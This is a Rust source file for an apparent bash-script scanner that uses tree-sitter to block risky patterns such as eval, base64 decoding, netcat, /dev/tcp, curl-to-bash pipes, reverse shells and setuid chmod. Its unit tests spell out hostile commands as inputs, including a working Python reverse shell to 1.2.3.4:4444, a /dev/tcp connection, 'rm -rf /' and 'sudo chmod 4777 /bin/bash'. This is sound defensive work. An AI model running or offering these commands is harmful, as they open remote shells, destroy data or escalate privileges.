use once_cell::sync::Lazy;
use streaming_iterator::StreamingIterator;
use tree_sitter::{Language, Node, Parser, Query, QueryCursor};

use crate::error::BashtionError;
pub mod queries;
use crate::static_analysis::queries::DANGEROUS_COMMAND;

static BASH_LANGUAGE: Lazy<Language> = Lazy::new(|| tree_sitter_bash::LANGUAGE.into());
static DANGEROUS_COMMAND_QUERY: Lazy<Query> =
    Lazy::new(|| Query::new(&BASH_LANGUAGE, DANGEROUS_COMMAND).expect("valid query"));

#[derive(Debug, PartialEq, Eq)]
pub struct BlockReason {
    pub rule: &'static str,
    pub detail: String,
}

#[derive(Debug, PartialEq, Eq)]
pub enum Verdict {
    Pass,
    Blocked(BlockReason),
}

pub fn analyze(script: &str) -> Result<Verdict, BashtionError> {
    let mut parser = Parser::new();
    parser
        .set_language(&BASH_LANGUAGE)
        .map_err(|e| BashtionError::Other(format!("Failed to load bash grammar: {e}")))?;

    let tree = parser
        .parse(script, None)
        .ok_or_else(|| BashtionError::Other("Failed to parse script".into()))?;

    let rules: &[fn(&str, Node) -> Result<Option<BlockReason>, BashtionError>] = &[
        rule_dangerous_commands,
        rule_dev_tcp,
        rule_pipeline_curl_shell,
        rule_python_reverse_shell,
        rule_sudo_chmod_setuid_shell,
    ];

    for rule in rules {
        if let Some(reason) = rule(script, tree.root_node())? {
            return Ok(Verdict::Blocked(reason));
        }
    }

    Ok(Verdict::Pass)
}

fn rule_dangerous_commands(script: &str, root: Node) -> Result<Option<BlockReason>, BashtionError> {
    let mut cursor = QueryCursor::new();
    let cmd_name_idx = DANGEROUS_COMMAND_QUERY
        .capture_index_for_name("cmd_name")
        .ok_or_else(|| BashtionError::Other("Query missing cmd_name capture".into()))?;
    let dangerous_cmd_idx = DANGEROUS_COMMAND_QUERY
        .capture_index_for_name("dangerous_command")
        .ok_or_else(|| BashtionError::Other("Query missing dangerous_command capture".into()))?;

    let mut matches = cursor.matches(&DANGEROUS_COMMAND_QUERY, root, script.as_bytes());
    while let Some(m) = matches.next() {
        let mut command_node: Option<Node> = None;
        let mut name_text: Option<String> = None;
        for capture in m.captures.iter() {
            if capture.index == cmd_name_idx {
                name_text = Some(node_text(capture.node, script));
            }
            if capture.index == dangerous_cmd_idx {
                command_node = Some(capture.node);
            }
        }

        let name = match name_text {
            Some(n) => n,
            None => continue,
        };

        let command = match command_node {
            Some(n) => n,
            None => continue,
        };

        let args = collect_arguments(command, script);

        if name == "eval" {
            return Ok(Some(BlockReason {
                rule: "eval",
                detail: "Dynamic execution via eval".to_string(),
            }));
        }

        if name == "base64" && has_flag_any(&args, &["-d", "--decode"]) {
            return Ok(Some(BlockReason {
                rule: "base64_decode",
                detail: "Obfuscation via base64 decode".to_string(),
            }));
        }

        if name == "openssl" {
            let has_enc = args.iter().any(|a| a == "enc");
            if has_enc && has_flag_any(&args, &["-d", "--decode"]) {
                return Ok(Some(BlockReason {
                    rule: "openssl_decode",
                    detail: "Obfuscation via openssl enc -d".to_string(),
                }));
            }
        }

        if matches!(name.as_str(), "nc" | "netcat" | "telnet") {
            return Ok(Some(BlockReason {
                rule: "netcat_like",
                detail: format!("Network backdoor tool detected: {}", name),
            }));
        }

        if name == "rm" {
            let destructive_flag = args.iter().any(|a| a == "-rf" || a == "-fr");
            let targeting_root = args.iter().any(|a| a == "/");
            if destructive_flag && targeting_root {
                return Ok(Some(BlockReason {
                    rule: "rm_root",
                    detail: "Destructive command 'rm -rf /'".to_string(),
                }));
            }
        }
    }

    Ok(None)
}

fn rule_dev_tcp(script: &str, root: Node) -> Result<Option<BlockReason>, BashtionError> {
    let mut stack = vec![root];
    while let Some(node) = stack.pop() {
        let kind = node.kind();
        if kind == "comment" || kind == "string" {
            continue;
        }

        if kind == "word" && node_text(node, script).contains("/dev/tcp/") {
            return Ok(Some(BlockReason {
                rule: "dev_tcp",
                detail: "Network backdoor via /dev/tcp detected".to_string(),
            }));
        }

        let mut cursor = node.walk();
        for child in node.named_children(&mut cursor) {
            stack.push(child);
        }
    }

    Ok(None)
}

fn rule_pipeline_curl_shell(
    script: &str,
    root: Node,
) -> Result<Option<BlockReason>, BashtionError> {
    let mut stack = vec![root];
    while let Some(node) = stack.pop() {
        let kind = node.kind();
        if kind == "comment" || kind == "string" {
            continue;
        }

        if kind == "pipeline" && pipeline_curl_to_shell(node, script) {
            return Ok(Some(BlockReason {
                rule: "curl_pipeline",
                detail: "curl|wget piped to bash/sh".to_string(),
            }));
        }

        let mut cursor = node.walk();
        for child in node.named_children(&mut cursor) {
            stack.push(child);
        }
    }

    Ok(None)
}

fn rule_python_reverse_shell(
    script: &str,
    root: Node,
) -> Result<Option<BlockReason>, BashtionError> {
    let mut stack = vec![root];
    while let Some(node) = stack.pop() {
        let kind = node.kind();
        if kind == "comment" || kind == "string" {
            continue;
        }

        if kind == "command" {
            if let Some(reason) = command_python_reverse_shell(node, script) {
                return Ok(Some(reason));
            }
        }

        let mut cursor = node.walk();
        for child in node.named_children(&mut cursor) {
            stack.push(child);
        }
    }
    Ok(None)
}

fn rule_sudo_chmod_setuid_shell(
    script: &str,
    root: Node,
) -> Result<Option<BlockReason>, BashtionError> {
    let mut stack = vec![root];
    while let Some(node) = stack.pop() {
        let kind = node.kind();
        if kind == "comment" || kind == "string" {
            continue;
        }

        if kind == "command" {
            if let Some(reason) = command_sudo_chmod(node, script) {
                return Ok(Some(reason));
            }
        }

        let mut cursor = node.walk();
        for child in node.named_children(&mut cursor) {
            stack.push(child);
        }
    }
    Ok(None)
}

fn pipeline_curl_to_shell(node: Node, script: &str) -> bool {
    let mut cursor = node.walk();
    let commands: Vec<Node> = node
        .named_children(&mut cursor)
        .filter(|n| n.kind() == "command")
        .collect();
    if commands.len() < 2 {
        return false;
    }
    let first = get_command_name(commands.first().unwrap(), script);
    let last = get_command_name(commands.last().unwrap(), script);
    matches!(first.as_deref(), Some("curl") | Some("wget"))
        && matches!(last.as_deref(), Some("bash") | Some("sh"))
}

fn command_python_reverse_shell(command: Node, script: &str) -> Option<BlockReason> {
    let name = get_command_name(&command, script)?;
    if !matches!(name.as_str(), "python" | "python3") {
        return None;
    }
    let args = collect_arguments(command, script);
    if is_python_reverse_shell(&args) {
        return Some(BlockReason {
            rule: "python_reverse_shell",
            detail: "Python reverse shell detected".to_string(),
        });
    }
    None
}

fn command_sudo_chmod(command: Node, script: &str) -> Option<BlockReason> {
    let name = get_command_name(&command, script)?;
    if name != "sudo" {
        return None;
    }
    let args = collect_arguments(command, script);
    if is_sudo_chmod_priv_escalation(&args) {
        return Some(BlockReason {
            rule: "sudo_chmod_setuid",
            detail: "Priv-escalation via sudo chmod on shell".to_string(),
        });
    }
    None
}

fn is_python_reverse_shell(args: &[String]) -> bool {
    // Look for -c payloads containing socket connect and subprocess/dup2 patterns
    let mut iter = args.iter().peekable();
    while let Some(arg) = iter.next() {
        if arg == "-c" {
            if let Some(payload) = iter.peek() {
                if payload_contains_reverse_shell(payload) {
                    return true;
                }
            }
        } else if let Some(stripped) = arg.strip_prefix("-c") {
            if payload_contains_reverse_shell(stripped) {
                return true;
            }
        }
    }
    false
}

fn payload_contains_reverse_shell(payload: &str) -> bool {
    payload.contains("socket")
        && payload.contains("connect(")
        && (payload.contains("subprocess") || payload.contains("os.dup2"))
}

fn is_sudo_chmod_priv_escalation(args: &[String]) -> bool {
    if args.len() < 3 {
        return false;
    }
    if args[0] != "chmod" {
        return false;
    }
    let mode = &args[1];
    let target = &args[2];
    let suspicious_mode = mode.starts_with('4') && mode.len() == 4; // setuid/setgid bits
    let target_shell = target.contains("/bin/bash") || target.contains("/bin/sh");
    suspicious_mode && target_shell
}

fn get_command_name(command: &Node, script: &str) -> Option<String> {
    let mut cursor = command.walk();
    for child in command.children_by_field_name("name", &mut cursor) {
        return Some(node_text(child, script));
    }
    None
}

fn collect_arguments(command: Node, script: &str) -> Vec<String> {
    let mut cursor = command.walk();
    let mut args = Vec::new();
    for arg in command.children_by_field_name("argument", &mut cursor) {
        args.push(node_text(arg, script));
    }
    args
}

fn has_flag_any(args: &[String], flags: &[&str]) -> bool {
    args.iter()
        .any(|a| flags.iter().any(|flag| a == flag || a.starts_with(flag)))
}

fn node_text(node: Node, script: &str) -> String {
    let byte_range = node.byte_range();
    script
        .as_bytes()
        .get(byte_range)
        .map(|b| String::from_utf8_lossy(b).to_string())
        .unwrap_or_default()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn flag_detection() {
        assert!(has_flag_any(&vec!["-d".into()], &["-d", "--decode"]));
        assert!(has_flag_any(&vec!["--decode".into()], &["-d", "--decode"]));
        assert!(!has_flag_any(&vec!["-x".into()], &["-d", "--decode"]));
    }

    #[test]
    fn static_blocks_eval() {
        let verdict = analyze("eval ls").unwrap();
        assert!(matches!(verdict, Verdict::Blocked(_)));
    }

    #[test]
    fn static_blocks_base64_decode() {
        let verdict = analyze("base64 -d something").unwrap();
        assert!(matches!(verdict, Verdict::Blocked(_)));
    }

    #[test]
    fn static_allows_base64_encode() {
        let verdict = analyze("echo test | base64").unwrap();
        assert!(matches!(verdict, Verdict::Pass));
    }

    #[test]
    fn static_blocks_rm_root() {
        let verdict = analyze("rm -rf /").unwrap();
        assert!(matches!(verdict, Verdict::Blocked(_)));
    }

    #[test]
    fn static_blocks_dev_tcp() {
        let verdict = analyze("cat </dev/tcp/1.2.3.4/4444").unwrap();
        assert!(matches!(verdict, Verdict::Blocked(_)));
    }

    #[test]
    fn static_allows_simple_echo() {
        let verdict = analyze("echo safe").unwrap();
        assert!(
            matches!(verdict, Verdict::Pass),
            "simple echo should be allowed"
        );
    }

    #[test]
    fn blocks_curl_to_bash_pipeline() {
        let script = "curl https://example.com/install.sh | bash";
        let verdict = analyze(script).unwrap();
        assert!(
            matches!(verdict, Verdict::Blocked(_)),
            "curl|bash should be blocked"
        );
    }

    #[test]
    fn blocks_python_reverse_shell_pattern() {
        let script = "python -c \"import socket,subprocess,os;s=socket.socket();s.connect(('1.2.3.4',4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];subprocess.call(['bash','-i'])\"";
        let verdict = analyze(script).unwrap();
        assert!(
            matches!(verdict, Verdict::Blocked(_)),
            "python reverse shell should be blocked"
        );
    }

    #[test]
    fn blocks_sudo_chmod_setuid_shell() {
        let script = "sudo chmod 4777 /bin/bash";
        let verdict = analyze(script).unwrap();
        assert!(
            matches!(verdict, Verdict::Blocked(_)),
            "sudo chmod on shell should be blocked"
        );
    }
}
